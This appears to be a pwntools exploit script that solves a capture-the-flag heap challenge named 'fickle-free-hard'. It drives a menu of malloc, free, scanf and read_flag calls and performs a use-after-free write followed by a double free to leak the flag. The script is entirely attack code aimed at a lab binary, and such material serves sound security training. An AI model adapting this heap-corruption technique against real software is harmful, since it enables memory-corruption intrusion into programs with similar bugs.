#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/fickle-free-hard")

def malloc(io,size):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode())
    io.sendline(b"malloc")
    s = io.recvuntil(b"Size:")
    print(s.decode())
    io.sendline(str(size).encode())
    return io

def puts(io):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode('latin-1'))
    io.sendline(b"puts")
    return io,data

def free(io):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode())
    io.sendline(b"free")
    return io

def read_flag(io):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode())
    io.sendline(b"read_flag")
    return io

def quit(io):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode())
    io.sendline(b"quit")
    return io

def scanf(io,d):
    data = io.recvuntil(b"Function (malloc/free/puts/scanf/read_flag/quit):")
    print(data.decode())
    io.sendline(b"scanf")
    io.sendline(d.encode())
    return io


def main():
    io = process()
    io = malloc(io,0x143)
    io = free(io)
    io = scanf(io,"a"*9)
    io = free(io)
    io = read_flag(io)
    io,data = puts(io)
    io = quit(io)
    io.close()

if __name__ == "__main__":
    main()


io = process()
